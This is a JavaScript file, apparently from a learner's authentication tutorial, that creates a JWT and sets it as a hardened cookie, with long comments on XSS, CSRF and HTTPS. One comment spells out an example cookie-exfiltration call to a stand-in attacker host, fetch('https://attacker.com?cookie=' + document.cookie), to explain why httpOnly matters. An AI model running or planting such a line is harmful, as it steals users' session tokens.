// step100: lets create the generateToken function here now.

// step101: lets import the jsonwebtoken package now , that will allow us to implement the authentication process there.
import jwt from "jsonwebtoken"

// step102: now lets create the generateToken function now ; we had seen earlier that we called this function with two parameters : userId and res , so lets do that here now.
export const generateToken = (userId , res) => {

    // step103: now lets create a token for the user below , so that we kow which user is which one and is authenticated or not.

    // step104: see the step105.txt for authentication workflow to be used here now there.

    // step106: now lets create the token below now.

    // step107: the jwt.sign is used to create a JWT token , which takes 3 parameters : payload is the first parameter i.e. the data inside the token ; then a secret to sign in the token , so that no one else can read the token ; and then an options object with an expiration time for the token i.e. in this case 7 days.

    // step108: so this function below makes a secured token with the user's id passed as parameter in the function above.

    // step109: the secret is needed because the jwt token is sent as cookie to client in browser , and using ai tools like "jwt.io" website they can see the contents of the token , but they can't try to fake an modify it to login to some other user , because : we have set a secret here in the server ; so as we know that the server sends the cookie containing jwt to client when it signs up , and browser stores the cookie immediately ; and now browser will send it automatically with every HTTP request to the same domain ; On every request (e.g., GET /profile): Browser sends the cookie along with the request headers ; Server can read this cookie from req.cookies (if you use middleware like cookie-parser) ; Server extracts the JWT from the cookie ; Server verifies it using jwt.verify(token, JWT_SECRET) ; If token is valid → server knows which user is making the request (userId from payload) ; If token is invalid or expired → server rejects the request (user must log in again) ; thus it prevents unauthorized access in the authentication process.
    const token = jwt.sign({ userId }, process.env.JWT_SECRET, { expiresIn: "7d" })

    // step110: lets send it back to the user as a cookie now.

    // step111: "jwt" is the name of the cookie , then we pass "token" in the cookie ; then 
    res.cookie("jwt", token, { 

        // step112: set the 7 days expiration time for the cookie now in milliseconds as per the syntax
        maxAge : 7*24*60*60*1000,

        // step113: below line ensures that token can be accessed via HTTP request only , and can't be accessed using JavaScript by hackers ; this is called : "Cross-site-scripting" attacks OR XSS attacks ; so the below line prevents from such attacks.

        // step114: so now : With httpOnly: true, document.cookie won’t show this cookie ; so now : If a hacker injects malicious JavaScript into your site (XSS attack), they cannot steal the JWT from the cooki ; but : Without httpOnly, the hacker could do something like: fetch("https://attacker.com?cookie=" + document.cookie) and steal the token from the cookie.

        // XSS = when a hacker runs malicious JS in your site ; so to prevent that : httpOnly cookie = browser won’t let any JS code access that cookie ; This protects your JWT from being stolen by scripts.
        httpOnly : true, 

        // step115: now to prevent CSRF ttacks we do the following below ; sameSite controls when the browser sends the cookie with requests ; "strict" = the cookie is sent only for requests coming from the same site (your domain) ; If a request comes from another site, the cookie won’t be sent ; CSRF (Cross-Site Request Forgery) attacks happen when : User is logged in on your site (has a cookie) ; Hacker tricks user into visiting a malicious site OR Malicious site sends a request to your server using the user’s cookie automatically.

        // step116: With sameSite: "strict" → browser won’t send the cookie for cross-site requests ; thus : Hacker’s request fails because the server doesn’t get the token.

        // step117: so its like : Cookie = your house key. sameSite: "strict" = key only works when you enter your own house, not any other house. Hacker can’t use it to open a door from another site.

        // step118: thus : sameSite: "strict" → cookie sent only for same-site requests ; Prevents CSRF attacks by blocking cookies from being sent to malicious cross-site requests.
        sameSite : "strict",

        // step119: then we can have that : its secure if we are in production as production websites have "https" where "s" stands for secure , but if we are in development i.e "http://localhost:3000" then we can have it as false as it is not a secure website , as we have "http" no "s" , not secure ; so : secure → ensures cookie is sent only on secure (HTTPS) connections ; its important because : Cookies that contain sensitive info (like JWTs) should not be sent over plain HTTP in production ; HTTPS encrypts the connection → prevents eavesdropping (In networking, eavesdropping means when a hacker secretly listens to or captures data being sent between your browser and the server.) ; During development, localhost usually doesn’t use HTTPS → need false to test locally.
        secure : process.env.NODE_ENV === "development" ? false : true
     })

    //  step120: finally return the token from this function.
    return token;

    // step121: lets test this on POSTMAN now , steps of testing in step122.txt file now there.
}
    